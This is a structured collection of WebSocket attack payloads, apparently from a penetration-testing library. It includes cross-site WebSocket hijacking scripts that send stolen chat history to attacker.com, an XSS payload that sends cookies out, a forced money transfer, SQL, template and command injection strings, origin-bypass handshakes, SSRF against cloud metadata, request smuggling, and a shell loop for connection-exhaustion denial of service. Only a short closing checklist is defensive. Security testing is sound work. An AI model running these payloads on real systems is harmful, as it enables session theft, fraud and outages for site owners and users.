meta.name: WebSocket Attacks
meta.description: WebSocket attack payloads covering CSWSH, injection, XSS via WS, SSRF, origin bypass, and message manipulation.

payloads.code:
<script>
  var ws = new WebSocket('wss://target.com/chat');
  ws.onopen = () => ws.send('{"action":"getHistory"}');
  ws.onmessage = e => fetch('https://attacker.com/?d='+btoa(e.data));
</script>
payloads.description: Cross-Site WebSocket Hijacking (CSWSH): steal chat history from victim's authenticated WS session

payloads.code:
<script>
  fetch('https://target.com/api/csrf-token', {credentials:'include'})
    .then(r=>r.json()).then(d=>{
      var ws = new WebSocket('wss://target.com/ws?token='+d.token);
      ws.onopen = () => ws.send('{"type":"transfer","to":"attacker","amount":5000}');
    });
</script>
payloads.description: CSWSH with CSRF token: fetch token first, then hijack WebSocket to trigger privileged action

payloads.code:
# Test for CSWSH: WebSocket lacks CSRF protection if:
# 1. Server accepts connections from any origin
# 2. Auth is via cookies (sent automatically by browser)
# 3. No Origin header validation on upgrade
# Check: compare Origin: https://evil.com vs Origin: https://target.com response
payloads.description: CSWSH detection: verify Origin header validation on WebSocket upgrade request

payloads.code: {"username": "admin'--", "message": "hello"}
payloads.description: SQL injection via WebSocket message: inject SQL in username or message field

payloads.code: {"search": "' OR '1'='1", "room": "general"}
payloads.description: SQLi via WS search parameter: boolean-based blind injection in WebSocket search

payloads.code: {"template": "{{7*7}}", "context": "user"}
payloads.description: SSTI via WebSocket: send template expression in message body field

payloads.code: {"cmd": "ping 127.0.0.1", "type": "diagnostic"}
payloads.description: Command injection via WebSocket: inject OS command in diagnostic/admin message type

payloads.code: {"message": ""}
payloads.description: Stored XSS via WebSocket: inject XSS payload in broadcast message, executes on all connected clients

payloads.code: {"message": "<script>var i=new Image;i.src='https://attacker.com/?x='+document.cookie</script>"}
payloads.description: XSS via WS with script tag: broadcast to all clients in chatroom

payloads.code: {"username": "<svg onload=alert(1)>", "room": "lobby"}
payloads.description: SVG XSS via WebSocket username: SVG executed when username rendered in chat UI

payloads.code:
GET /chat HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: http://localhost
payloads.description: Origin bypass attempt: use localhost/internal origin to bypass origin whitelist

payloads.code:
GET /chat HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: null
payloads.description: Null origin bypass: send Origin: null (triggered by sandboxed iframes, data URIs)

payloads.code:
GET /chat HTTP/1.1
Origin: https://target.com.evil.com
Upgrade: websocket
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
payloads.description: Subdomain origin bypass: use subdomain that starts with target domain to fool prefix matching

payloads.code:
GET /internal/admin HTTP/1.1
Host: 169.254.169.254
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
payloads.description: SSRF via WebSocket: upgrade request targeting AWS metadata service or internal hosts

payloads.code: {"type": "connect", "url": "ws://169.254.169.254/latest/meta-data/"}
payloads.description: SSRF via WS message: server-side WS client connects to attacker-controlled URL including cloud metadata

payloads.code: {"proxy": "ws://localhost:8080/admin", "action": "forward"}
payloads.description: WebSocket proxy abuse: use server as WS proxy to reach internal services

payloads.code:
# WebSocket request smuggling via HTTP upgrade
GET / HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: keep-alive, Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
# After 101 Switching Protocols, send raw HTTP request through WS tunnel
GET /admin HTTP/1.1
Host: target.com
payloads.description: WebSocket tunneling for HTTP request smuggling: send HTTP requests through established WS tunnel

payloads.code:
# Message replay attack
# 1. Intercept valid WS message: {"action":"transfer","amount":10,"to":"bob","nonce":"abc123"}
# 2. Replay same message — if nonce not validated server-side
ws.send('{"action":"transfer","amount":10,"to":"bob","nonce":"abc123"}')
payloads.description: WebSocket message replay: resend intercepted authenticated messages if nonce/sequence not enforced
WebSocket message tampering: intercept and modify role/privilege fields in WS messages

payloads.code:
# Protocol downgrade: force WS to fall back to HTTP polling
# Some apps fall back to XHR long-polling if WS unavailable
# Intercept initial WS handshake and return 400
# Then watch for HTTP fallback endpoint — may have weaker auth
payloads.description: Protocol downgrade: block WS upgrade to force weaker HTTP long-poll fallback with looser auth
WebSocket DoS via message flooding: send large messages rapidly to exhaust server memory/CPU

payloads.code:
# WS authentication bypass
# Some endpoints check auth on HTTP upgrade but not per-message
# After auth'ing WS connection with low-priv token:
ws.send('{"action":"admin_panel","target":"users"}')
# Server may not re-verify privilege per message
payloads.description: Per-message auth bypass: authenticate WS connection, then send privileged messages without re-auth

payloads.code:
# Insecure WS: ws:// instead of wss://
# Intercept plaintext WS traffic on same network (coffee shop, etc.)
# Using mitmproxy:
mitmproxy --mode transparent --ssl-insecure
# Then capture and modify WS frames in transit
payloads.description: Plaintext WS interception: MitM attack on unencrypted ws:// connections on shared networks

payloads.code:
# Subprotocol abuse
GET /ws HTTP/1.1
Sec-WebSocket-Protocol: admin, graphql, v2
# Server may grant admin subprotocol if any listed are accepted
# Check response: Sec-WebSocket-Protocol: admin
payloads.description: Subprotocol escalation: request privileged subprotocol (admin, graphql) in WS handshake

payloads.code:
python3 -c "
import websocket
ws = websocket.create_connection('wss://target.com/chat')
ws.send('{\"type\":\"ping\",\"payload\":\"'+'A'*65536+'\"}')
print(ws.recv())
ws.close()
"
payloads.description: WebSocket fuzzing: send oversized/malformed payloads to find buffer overflows or crashes

payloads.code:
# Mass connection DoS
for i in $(seq 1 10000); do
  (python3 -c "
import websocket, time
ws = websocket.create_connection('wss://target.com/ws')
time.sleep(300)
" &)
done
# Exhaust WS connection pool — legitimate users can't connect
payloads.description: WebSocket connection pool exhaustion: open thousands of idle connections to block legitimate users
Cross-protocol WebSocket attack: open WS to internal TCP services, send raw protocol commands

payloads.code:
# Detection checklist
# [ ] Is Origin header validated on upgrade? (compare evil.com vs target.com)
# [ ] Are cookies/tokens validated per-message or only on connect?
# [ ] Is wss:// enforced? (no fallback to ws://)
# [ ] Are message sizes limited? (max frame size)
# [ ] Are connection counts limited per IP?
# [ ] Are nonces/sequence numbers used to prevent replay?
# [ ] Does server validate subprotocol header?
payloads.description: WebSocket security testing checklist: enumerate key security controls to verify
